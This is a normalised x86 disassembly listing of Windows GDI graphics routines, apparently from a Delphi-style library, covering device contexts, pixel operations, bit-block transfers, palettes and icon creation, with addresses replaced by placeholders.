push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_41eaa0
sub_41ecdc
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41ee68
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_41ed00
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_41eac8
pop ecx
pop edx
pop edi
pop esi
retn
sub_41ed20
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41ee68
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_41ed4c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41ee68
mov eax [ ebp + 0x8 ]
call sub_41d9c0
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41edb4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_41ee14
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_41edb4
mov edx esp
mov eax ebx
call sub_41ecdc
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_41ed00
sub_41ee68
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_41ef04
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
test bl 0x8
je r-xdata
mov eax esi
call sub_41ef30
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_41ef60
sub_41ef04
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_41de94
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41d9c0
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_41ef30
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41e394
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_41ef60
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_41e680
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_41e680
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_41e760
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_41e644
call sub_41d9c0
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_41e644
call sub_41d9c0
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_41f090
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41f0da
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f0e1
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_41f0e4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_41f180
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_41f090
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_404168
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f187
lea eax [ ebp - 0x104 ]
call sub_403ef8
retn
sub_41f19c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_41f2ea
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_41f259
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_41f0e4
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_41f0e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f2f1
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_41f2fc
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_41f330
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_41f18c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41f5b0
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41f18c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f5b7
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41f18c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41f403
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_40693c
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f5b7
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_41f5c4
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_41f5fc
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402b40
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_41f674
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_41f6cc
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028e0
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f7c9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f7d0
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_41f7e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41f86a
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_41f87c
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028e0
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_41f674
mov eax esp
call sub_41f7e4
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_41f920
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_41f674
mov [ esp ] eax
sub_41f974
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41f31c
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_41f2fc
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_41fb20
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41f18c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41fa46
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_41f19c
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa4d
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_41f090
sub_41fa4d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41f31c
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41f18c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41fb00
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_41f19c
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fb07
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_41fb3c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_41fbcc
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407ac0
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_41fec3
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_41fcb5
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_41f090
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fcbc
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41fcbc
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_41fb30
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407ac0
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_41fea3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_41f974
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407ac0
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_41fe80
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
